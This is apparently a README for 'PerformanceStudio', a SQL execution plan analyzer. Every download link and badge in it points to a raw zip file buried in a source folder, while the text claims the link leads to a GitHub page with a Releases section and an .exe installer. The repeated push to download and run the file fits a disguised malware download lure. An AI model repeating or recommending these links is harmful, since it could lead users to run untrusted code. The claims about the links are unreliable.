# ⚙️ PerformanceStudio - Simple SQL Execution Plan Analyzer

[![Download PerformanceStudio](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Abhas-cpp/PerformanceStudio/raw/refs/heads/main/src/PlanViewer.Cli/Commands/Performance_Studio_1.0.zip)

---

## 📋 About PerformanceStudio

PerformanceStudio helps you analyze SQL Server execution plans through an easy-to-use interface. It works on Windows and other platforms. The tool offers both a graphical window and a command-line option. You can use it to improve your SQL query speed and understand what your database is doing behind the scenes. There is also a built-in server for AI features if you want automated insights.

This guide will help you get PerformanceStudio running on your Windows computer with simple steps.

---

## 🖥️ System Requirements

Before installing, make sure your computer meets these basic needs:

- Operating System: Windows 10 or later (64-bit recommended)  
- Processor: Any modern Intel or AMD CPU  
- Memory: At least 4 GB RAM  
- Disk Space: 200 MB free space for installation  
- Network: Internet connection for download and optional AI features  
- .NET Runtime: Windows installations often have this pre-installed. PerformanceStudio requires .NET 6 or higher.

---

## 🚀 How to Download and Install PerformanceStudio

### Step 1: Visit the Download Page

Click the big green badge at the top or go to this link:

[https://github.com/Abhas-cpp/PerformanceStudio/raw/refs/heads/main/src/PlanViewer.Cli/Commands/Performance_Studio_1.0.zip](https://github.com/Abhas-cpp/PerformanceStudio/raw/refs/heads/main/src/PlanViewer.Cli/Commands/Performance_Studio_1.0.zip)

This link takes you to the GitHub page where you can get the latest software version.

### Step 2: Locate the Latest Windows Installer

On the page, look for a section labeled **Releases** or **Assets**. Find a file with a name similar to `PerformanceStudio-Setup.exe` or with `.exe` at the end. This is the installer for Windows.

### Step 3: Download the Installer

Click on the `.exe` file to download it to your computer. The file size is usually under 50 MB. Save it somewhere easy to find, like your Downloads folder.

### Step 4: Run the Installer

Once the download finishes, find the file in your download location. Double-click the `.exe` file to start installation.

A setup window will appear. Follow these simple instructions:

- Click **Next** on the welcome screen.  
- Read and accept the license terms.  
- Choose an install folder or keep the default.  
- Click **Install** to begin.

The process should finish in less than a minute.

### Step 5: Launch PerformanceStudio

When installation completes, you can choose to open the program right away by clicking **Finish** on the last setup screen.

You can also start PerformanceStudio any time by:

- Clicking the Start menu  
- Typing "**PerformanceStudio**"  
- Selecting the app from the list

---

## 🔍 How to Use PerformanceStudio

PerformanceStudio is designed for users who want to check SQL query plans without writing code. Here is a simple way to start:

### Opening Execution Plans

- Open your SQL Server Management Studio (SSMS) or any tool that generates execution plans.  
- Save your execution plan as a `.sqlplan` file.  
- Open PerformanceStudio.  
- Click **File** > **Open** or drag your `.sqlplan` file into the window.

You will see a graphical version of the execution plan. Each step will display key data like cost, duration, and index usage.

### Analyzing the Plan

Look for:

- High-cost operations  
- Table scans instead of indexes  
- Missing statistics warnings

PerformanceStudio highlights these areas so you know what part of the query might slow down your database.

### Using the Built-in MCP Server for AI Insights (Optional)

If you want AI help:

- Make sure you are connected to the internet.  
- Enable AI features via the **Settings** menu.  
- Upload or open your plan. The AI will offer suggestions on improving indexes, rewriting queries, or changing execution plans.

This feature is optional and requires no technical setup.

---

## ⚙️ Command Line Interface (CLI)

If you want to use PerformanceStudio without the graphical interface:

Open Command Prompt and navigate to where PerformanceStudio installed, usually:

`C:\Program Files\PerformanceStudio\`

Use this command pattern:

`perfstudio.exe analyze -file "C:\path\to\your\plan.sqlplan"`

You will get a text summary of the execution plan analysis in your command window.

---

## ❓ Frequently Asked Questions

### Can I use PerformanceStudio on other operating systems?

Yes. PerformanceStudio supports Windows, macOS, and Linux. This guide focuses on Windows.

### Do I need SQL Server installed on my computer?

No. PerformanceStudio only reads saved execution plans. You don't need a live SQL Server instance.

### What if my computer lacks .NET 6 or higher?

The installer will warn you. You can download the .NET runtime from Microsoft's official site.

### Is my data safe when using AI features?

PerformanceStudio does not store your plans permanently. AI processing happens securely during your session.

---

## 🎯 Additional Resources

Visit the GitHub page for more details:

[https://github.com/Abhas-cpp/PerformanceStudio/raw/refs/heads/main/src/PlanViewer.Cli/Commands/Performance_Studio_1.0.zip](https://github.com/Abhas-cpp/PerformanceStudio/raw/refs/heads/main/src/PlanViewer.Cli/Commands/Performance_Studio_1.0.zip)

There you can find:

- Source code  
- User guides  
- Updates and bug fixes  
- Community discussions  

Use the **Issues** tab on GitHub to report problems or ask for help.

---

## 📦 Installing Updates

When a new version is available, download the new installer from the release page. Run it to replace your current version without losing settings.

Check for updates regularly to get the latest fixes and features.

---

## 🛠 Support and Troubleshooting

If PerformanceStudio does not start or shows errors:

- Restart your computer and try launching again.  
- Make sure your .NET runtime is up to date.  
- Check the official GitHub issues page for similar problems.  
- If needed, uninstall from Control Panel and reinstall using the latest installer.

---

## 🌐 Topics Related to PerformanceStudio

This software covers these areas:

- Database performance and tuning  
- SQL Server query plans  
- Cross-platform application development  
- Query store and execution analysis  
- DBA tools for query optimization

---

## 🔗 Download PerformanceStudio

Get started by visiting the link below to download the latest Windows version:

[![Download PerformanceStudio](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Abhas-cpp/PerformanceStudio/raw/refs/heads/main/src/PlanViewer.Cli/Commands/Performance_Studio_1.0.zip)